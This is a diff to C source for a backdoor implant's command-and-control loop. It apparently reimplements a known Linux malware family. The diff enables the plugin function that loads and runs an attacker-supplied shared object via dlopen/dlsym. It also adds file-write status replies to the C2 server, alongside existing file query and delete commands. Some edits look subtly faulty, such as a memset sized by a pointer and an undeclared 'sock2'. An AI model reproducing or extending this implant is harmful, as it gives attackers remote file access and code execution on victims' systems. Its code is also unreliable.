@@ -51,22 +51,21 @@ void c2_loop() {
     }
 
 
-		if (first_pkt == false) {
-			// initial pkt registration
-			char *initial_pkt = initial_rota_pkt();
-			memcpy(&initial_pkt[14], &rota_c2_heartbeat, 4);
-			send(sock, initial_pkt, 82, 0);
+    if (first_pkt == false) {
+        // initial pkt registration
+        char *initial_pkt = initial_rota_pkt();
+        memcpy(&initial_pkt[14], &rota_c2_heartbeat, 4);
+        send(sock, initial_pkt, 82, 0);
 
-		} else {
-			first_pkt = false;
-			char *initial_pkt = initial_rota_pkt();
-			send(sock, initial_pkt, 82, 0);
-		}
-
+    } else {
+        first_pkt = false;
+        char *initial_pkt = initial_rota_pkt();
+        send(sock, initial_pkt, 82, 0);
+    }
     // interactive c2 loop
-        //int i = 0;
+    #ifdef DEBUG
         printf("(%d) In c2 loop...\n", getpid());
-
+    #endif
         // receive
         int n = 0;
         int len = 0;
@@ -197,11 +196,18 @@ void c2_loop() {
             #endif
 
             // TODO - break this out into a stub function
-            FILE *fd = fopen("localFile", "w+");
-            fwrite(payload, sizeof(payload[0]), payload_length, fd);
+            FILE *fd = fopen("local_rota_file", "w+");
+            int res = fwrite(payload, sizeof(payload[0]), payload_length, fd);
             fclose(fd);
 
-            build_c2_response(buffer, cmd_id, sock);
+            if (res  == payload_length) {
+                char *msg = "successfully wrote entire file.";
+                build_c2_response(msg, cmd_id, sock2);
+            } else {
+                char *msg = "Error writing file.";
+                build_c2_response(msg, cmd_id, sock2);
+            }
+
         }
         else if (memcmp(&rota_c2_query_file, cmd_id, 4) == 0) {
             #ifdef DEBUG
@@ -254,14 +260,13 @@ void c2_loop() {
                     printf("file %s does not exist", payload);
                     #endif
                 char *msg = "file does not exist";
-                build_c2_response(msg, cmd_id, sock);
+                build_c2_response(msg, cmd_id, sock2);
             }
         }
         else if (memcmp(&rota_c2_run_plugin_1, &cmd_id, 4) == 0) {
             #ifdef DEBUG
             printf("[+] Rota C2 Run Plugin 1\n");
             #endif
-
 
         } else {
             #ifdef DEBUG
@@ -273,12 +278,12 @@ void c2_loop() {
         free(payload);
         free(cmd_id);
         memset(buffer, 0, strlen(buffer));
-				close(sock);
+        close(sock);
     }
 
         memset(buffer, 0, strlen(buffer));
         sleep(sleepy_time);
-				close(sock);
+        close(sock);
     }
 
     close(sock);
@@ -427,11 +432,11 @@ bool c2_delete_file(char *fpath) {
 
 void c2_run_plugin_1(char *soPath, char *funcName) {
 
-    //void *handle = dlopen(soPath, RTLD_LAZY);
-    //void (*func_ptr)() = dlsym(handle, funcName);
+    void *handle = dlopen(soPath, RTLD_LAZY);
+    void (*func_ptr)() = dlsym(handle, funcName);
     // execution of shared object
-    //func_ptr();
-    //dlclose(handle);
+    func_ptr();
+    dlclose(handle);
 }
 
 
@@ -495,7 +500,7 @@ char *parse_c2_payload( char *buffer, int length) {
         payload = "error allocating data";
         return payload;
     }
-    memset(payload, 0, length);
+    memset(payload, 0, sizeof payload);
     // copy last N-bytes from rota payload
     memcpy(payload, &buffer[82], length);
     return payload;
@@ -513,8 +518,8 @@ void build_c2_response(char *buffer, char *cmd_id, int sock){
     memcpy(&rota_resp_pkt[4], sessionId, sizeof(sessionId));
 
     // convert and store integer in rota header
-    sprintf(buffer_len_hex, "%d", buffer_len);
-    memcpy(&rota_resp_pkt[8], buffer_len_hex, sizeof(buffer_len));
+    sprintf(buffer_len_hex, "%x", buffer_len);
+    memcpy(&rota_resp_pkt[8], buffer_len_hex, sizeof(buffer_len_hex));
 
     // update cmd_id in response packet
     memcpy(&rota_resp_pkt[14], cmd_id, 4);
